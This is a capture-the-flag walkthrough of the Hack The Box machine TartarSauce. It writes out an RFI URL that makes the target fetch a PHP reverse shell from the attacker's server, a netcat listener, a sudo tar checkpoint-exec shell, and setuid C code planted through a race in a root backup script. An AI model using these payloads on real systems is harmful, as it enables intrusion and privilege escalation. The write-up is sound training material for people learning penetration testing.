## Enumeration

Nmap scans show only port 80 is open, running Apache 2.4.18 on Ubuntu.

The home page fo the site gives a cool ASCII art image, and not much else.

Navigating to `/robots.txt` gives the below directories. Note that the Nmap `http-robots.txt` script above was also able to grab this data.

```
User-agent: *

Disallow: /webservices/monstra-3.0.4/
Disallow: /webservices/easy-file-uploader/
Disallow: /webservices/developmental/

```

Running `dirsearch` gives us the addition of the `/webservices/wp` subdirectory.

## Initial Shell

### WordPress Site

Navigating to the `/webservices/wp` site we found, we can see that it appears broken. Normally this is due to issues with DNS and the `/etc/hosts` file. HOwever, if we examine the source code, we can see that's not the case.

```html
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Test blog &raquo; Feed" href="http:/10.10.10.88/webservices/wp/index.php/feed/" />
<link rel="alternate" type="application/rss+xml" title="Test blog &raquo; Comments Feed" href="http:/10.10.10.88/webservices/wp/index.php/comments/feed/" />
```

Note that the links in the above code point to `http:/10.10.10.88`, so adding a hostname to `/etc/hosts` won't help here. Also, note that the second `/` is missing from `http://` in the links. This can be fixed by using a proxy like Burp to match and replace, but it still will only give a 404 error.

### WPSCAN

Since we still have a WordPress site, we should run `wpscan` to check for known plugins, themes, and users. We can run the scan with `wpscan --url http://10.10.10.88:80/webservices/wp -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive --api-token GetYourOwnAPIKey 2>&1`

This is the truncated results, showing that it found the below plugins:

 So it shows there is a known XSS in the Gwolle Guestbook plugin, but that doesn't apply to HTB. However, it does give us a link to the README file for the plugin, at `http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt`

 When we get to the changelog portion, we see the following for the latest verison (2.3.10)

 ```
 == Changelog ==

```

Troll much? So we're actually looking at version 1.5.3, NOT 2.3.10. Let's check Exploit-DB for vulnerabilities in this version.

<a href="/assets/htb-tartarsauce/sspt_gwolle.png"><img src="/assets/htb-tartarsauce/sspt_gwolle.png" width="95%"></a>

Looks like there's an RFI known for 1.5.3!

### RFI in Gwolle Guestbook

According to the advisory, we can inject our own URL into `http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website`. We also need to place a file called `wp-load.php` in the root of our web server, which can easily just be a PHP reverse shell.

We can grab the included PHP shell in Kali and copy it to our working directory with `cp /usr/share/webshells/php/php-reverse-shell.php wp-load.php`. This will rename it to the needed `wp-load.php`. We can now edit the file to point to our machine and port. Once that's set, we need to start a listener with `nc -lvnp 7500`. We also need to start a Python web server in the directory where `wp-load.php` is located. Use `python -m SimpleHTTPServer 80` to open the web server on port 80.

Now we just need to navigate to `http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.12/`

> NOTE: Don't leave out the trailing `/` in the above command, or it will not work. It took me way too long to figure this out. Also, you can use `curl -s` like I did in the below example.

## Privlege Escalation

### Enumerate as `www-data`

So now that we have a shell on the server, we can start enumeration for escalation.

![](/assets/htb-tartarsauce/wwwdata_os_enum.png)

We can see from some simple enumeration that we're in a shell was `www-data`, on a server running Ubuntu 16.04.4, with a kernel version of 4.15.0-041500-generic.

If we do `sudo -l` to see the sudoers file for `www-data`, we get the below result.

![](/assets/htb-tartarsauce/wwwdata_sudoers.png)

Interesting. So we can run `/bin/tar` as the user `onuma`.

### Using `tar` to escalate to `onuma`

As you may know, `tar` is a binary that allows you to gather multiple files into one. HOwever, we should check [GTFOBins](https://gtfobins.github.io/) to see if there is a way to get it to escalate us via `sudo`.

According to GTFOBins, we can use something like below to elevate our permissions with `tar` when running it with `sudo`.

`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

So let's break this down a bit:

- We know that we'll need to run this with `sudo`, specifically, with `sudo -u onuma`, to run `tar` as that user.
- The `-cf /dev/null /dev/null` section tells us a few things:
  - The `-c` option creates a new archive
  - The `-f /dev/null` option uses the `/dev/null` black hole
  - The extra `/dev/null` is the location we're saving the archive to.
- The `--checkpoint=1` option tells `tar` to display progress messages every X records.
- The `--checkpoint-action=exec=/bin/sh` options tells `tar` to run `/bin/sh` at each checkpoint, essentially giving us a shell.

Let's run it and see.

![](/assets/htb-tartarsauce/sudo_tar_onuma.png)

Just like that, we have a shell as `onuma`. We can get ourselves a better shell with `python -c 'import pty;pty.spawn("/bin/bash")'`.

![](/assets/htb-tartarsauce/onuma_pyshell.png)

Now all that's left is to grab `user.txt` from `/home/onuma/user.txt`

![](/assets/htb-tartarsauce/user_proof.png)

### Enumerate as `onuma`

Now that we have access as a user, let's do some proper enumeration of what we have.

In the users `/home` direcotry, we can see a `.ssh` folder, which normally will give us a private key that we can use for a good SSH session. In this case though, all that we have is the `known_hosts` file. 

![](/assets/htb-tartarsauce/ssh_folder.png)

If we check the `.nano` direcotry, we can see the `search_history` file, but it's just more trolling.

![](/assets/htb-tartarsauce/onuma_nano_dir.png)

We also have a `.mysql_history` file. Let's take a look at it.

![](/assets/htb-tartarsauce/mysql_history.png)

Nice. We have what looks like a password for MySQL access. However, trying to login to MySQL with some common usernames fails.

![](/assets/htb-tartarsauce/mysql_failed_access.png)

When we check the `/var/backups` directory, we can see 2 interesting files; `onuma_backup_error.txt` and `onuma_backup_test.txt`. Let's take a look at them.

```shell
onuma@TartarSauce:/var/backups$ cat onuma_backup_test.txt 
------------------------------------------------------------------------
Auto backup backuperer backup last ran at : Thu Jan 23 13:33:43 EST 2020
------------------------------------------------------------------------
```

So the `test` file looks like a log for a service called `backuperer`.

The `error` file looks like the matching error log for the service. We need to identify where this script is running from.

### PsPy64

We can use the `PsPy64` script to see what is running live on the system. This will give us insight to this `backuperer` script, and where it might be located.

Again, copy it to the system with `wget http://10.10.14.34/pspy64`, and make it executable with `chmod +x pspy64`. We can kick it off with `./pspy64`.

> Make sure you've elevated this to a good `bash` shell, with tab completion, before running this. It'll be much easier to just `CTRL-C` when your done, then having to launch a whole new shell as `www-data`.

After a few minutes, we get the below result:

```
2020/01/23 13:48:44 CMD: UID=0    PID=4005   | /bin/bash /usr/sbin/backuperer 
2020/01/23 13:48:44 CMD: UID=0    PID=4009   | /usr/bin/printf -

2020/01/23 13:48:44 CMD: UID=0    PID=4073   | /usr/bin/printf - 
2020/01/23 13:48:44 CMD: UID=0    PID=4081   | 
2020/01/23 13:48:44 CMD: UID=0    PID=4086   | /bin/sleep 30 
2020/01/23 13:48:44 CMD: UID=0    PID=4085   | /usr/bin/sudo -u onuma /bin/tar -zcvf /var/tmp/.dc20153ea96ef944e343519b7a36fe8c873b3905 /var/www/html 
2020/01/23 13:48:44 CMD: UID=1000 PID=4089   | /bin/tar -zcvf /var/tmp/.dc20153ea96ef944e343519b7a36fe8c873b3905 /var/www/html
```

So we know the script is running as `root` from `/usr/sbin/backuperer`. Let's check it out.

### Check out `backuperer` script

Here's the contents of the script:

```bash
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```

Let's try to break this script down a bit:

1. Deletes the previously extracted directory with `/bin/rm -rf $tmpdir/.* $check`
2. Backs up the current `$basedir` directory to `/var/tmp/$RANDOM$` with `/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &`
3. Sleeps for 30 seconds to allow the backup to complete.
4. Runs the `integrity_check` function, checking the current `/var/www/html` with the previously checked `/var/tmp/check/var/www/html`.
   1. If the directories are different, then print an error message to the log, and *Don't remove the `/var/tmp/check` directory*.
   2. If the directories match, then move the current `tar` package to `/var/backups/onuma-www-dev.bak`, and delete the `/var/tmp/check` directory.

So where is the flaw here?

We could take advantage of the 30 second `sleep` command to inject our own code into the newly created archive. This will let us do something like replace `robots.txt` with a symlink to `/root/root.txt`. While this would get us the flag, it won't get us a root shell, which I'm what I'm after.

### Exploiting `backuperer` with a SETUID binary

What we can do instead is take advantage of the fact that `tar` will extract items while maintaining permissions. Also, we can exploit the fact that if the `integrity_check` fails, it leaves the extracted directory in place. 

First, we need to create a mock `/var/www/html` directory locally, with a `SETUID` binary inside.

`mkdir -p /var/www/html` to make the mock directory.

Use the below code to create `setuid.c` in the mock directory:

```c
int main(void){
    setresuid(0,0,0);
    system("/bin/bash");
}
```

Now we compile the code with `gcc -m32 -o setuid setuid.c`.

>NOTE: If you use Kali in a VM, with a shared direcotry, you'll have to move the direcotry to something like `/tmp`. Otherwise, the SETUID bit will not set, as the group owning the folder is still `Vbox`.

Once that's all set, we need to create our own `tar` archive of the mock directory with `tar zcvf h4x.tar.gz var`

```shell
root@kali:/tmp# tar zcvf h4x.tar.gz var
var/
var/www/
var/www/html/
var/www/html/setuid
```

Now we can download it to our target with `wget` as before, and copy it to the `/var/tmp` directory.

From here, we just need to wait for the `backuperer` script to trigger. You can check it's next execution time with `systemctl list-timers`, or just run `ls -la` again until you see the randomly named tar archive, as below.

![](/assets/htb-tartarsauce/backup_tar_trigger.png)

Once you see the archive, run `cp h4x.tar.gz .stringofnumbershere` to replace the scripts archive, with our malicious one. Wait the 30 seconds to allow it to extract, and look for the `check` directory to appear.

Once you see `check`, you can simply navigate to it, and run the `setuid` binary to get a `root` shell!

![](/assets/htb-tartarsauce/launch_setuid.png)

All thats left is to grab the root flag!
